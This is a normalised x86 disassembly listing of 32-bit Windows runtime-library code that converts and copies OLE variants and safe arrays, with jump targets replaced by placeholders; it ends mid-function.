push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e4c0
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e5b0
jmp r-xdata
jmp r-xdata
call sub_40e6a0
sub_40e934
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e97e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b520
call sub_403890
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e985
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_40e99c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e9cc
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e9cc
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ea28
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e8f4
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e8f4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e99c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e8f4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e8f4
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e9cc
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e8f4
mov eax [ ebp - 0x314 ]
call sub_40ec20
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40eba4
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e8f4
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403e54
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_41060c
test al al
je r-xdata
mov eax ebx
call sub_40ea28
jmp r-xdata
push ebx
call VariantClear
call sub_40e8f4
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40ec3c
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40ec6c
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40ec6c
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40ecc8
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e8f4
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e8f4
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40ec20
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e64c
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e8f4
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e8f4
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40ec3c
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40ec6c
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e8f4
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e8f4
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ee9c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40eba4
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e8f4
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403ea8
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_41060c
test al al
je r-xdata
mov ecx sub_40ee94
mov edx esi
mov eax ebx
call sub_40ecc8
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e8f4
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40ef48
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40ee9c
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40eba4
sub_40ef8c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404534
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e900
pop ebx
pop ebp
retn 0x8
sub_40efc4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404534
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e900
pop ebx
pop ebp
retn 0x8
sub_40effc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f0b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404534
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e900
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f0b9
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_4040dc
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407a64
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404680
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_4040dc
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407a28
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404680
jmp r-xdata
jmp r-xdata
call sub_40e55c
sub_40f0c0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f17f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f15d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e900
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404644
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404730
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4040dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f164
lea eax [ ebp - 0x10 ]
call sub_40ec20
retn
sub_40f18c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f1e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ef48
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f1e9
lea eax [ ebp - 0x10 ]
call sub_40ec20
retn
sub_40f1f0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41060c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f265
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403ea8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ec20
retn
sub_40f274
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f7ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f2ad ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403ea8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403e54
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403ea8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40930c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ea8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40930c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403ea8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ef8c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4040dc
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40efc4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4040dc
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404644
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404730
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_4040dc
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40effc
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4040dc
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407e64
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403ea8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407e64
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f274
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f0c0
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403ea8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f7b2
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403e78
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40454c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403e78
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40454c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403e78
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40f18c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403ea8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403ea8
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e4c0
test ah 0x40
je r-xdata
mov eax esi
call sub_403e54
mov edx eax
mov eax ebx
call sub_40f1f0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40f0c0
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403ea8
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f0c0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403ea8
jmp r-xdata
jmp [ eax * 4 + jump_table_40f541 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40930c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40930c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ef8c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4040dc
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40efc4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4040dc
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40407c
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40effc
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4040dc
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403ea8
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407d78
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407e64
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407e64
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403ea8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f274
jmp r-xdata
sub_40f7b8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f862
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f845
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e900
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404644
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f84c
lea eax [ ebp - 0x10 ]
call sub_40ec20
retn
sub_40f870
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f8c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40ef48
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f99c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f8cd
lea eax [ ebp - 0x10 ]
call sub_40ec20
retn
sub_40f8d4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f98c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_41060c
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f993
lea eax [ ebp - 0x20 ]
call sub_404534
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f96f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_404644
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40ec20
retn
sub_40f99c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40feee
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f9d6 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404680
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404534
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404680
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40930c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404680
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40930c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404680
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ef8c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404570
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40efc4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404570
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404644
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404730
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40effc
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404570
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404680
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407d78
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407e64
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404680
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407e64
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404680
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f99c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f7b8
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404570
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fef5
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_40454c
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403e78
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_40454c
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403e78
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40454c
